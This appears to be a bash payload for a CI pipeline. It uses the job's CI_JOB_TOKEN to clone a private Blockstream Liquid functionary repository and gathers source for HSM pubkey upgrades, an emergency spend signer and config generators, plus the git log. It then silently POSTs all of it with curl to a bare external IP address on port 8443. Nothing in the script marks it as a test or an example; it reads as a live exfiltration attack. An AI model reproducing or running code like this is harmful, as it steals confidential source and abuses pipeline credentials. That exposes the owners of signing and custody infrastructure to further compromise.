#!/bin/bash
R=/tmp/r1
git clone --depth 1 "https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git" $R 2>/dev/null
{
echo "##S12##"
echo "##UPGRADE_PUBKEYS##"
cat $R/contrib/hsm/upgrade_pubkeys.src
echo "##EMERGENCY_MAIN##"
cat $R/emergency_spend_signer/src/main.rs
echo "##EMERGENCY_LIB##"
cat $R/emergency_spend_signer/src/lib.rs
echo "##EMERGENCY_README##"
cat $R/emergency_spend_signer/README.md
echo "##BLOCKSIGNER_RS##"
cat $R/generate_config/src/blocksigner.rs
echo "##WATCHMAN_RS##"
cat $R/generate_config/src/watchman.rs
echo "##INIT_HSM_GEN##"
cat $R/generate_config/src/init_hsm.rs
echo "##CONFIG_GEN##"
cat $R/generate_config/src/config.rs
echo "##GIT_LOG##"
cd $R && git log --oneline -30
echo "##S12_END##"
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s12 --data-binary @-
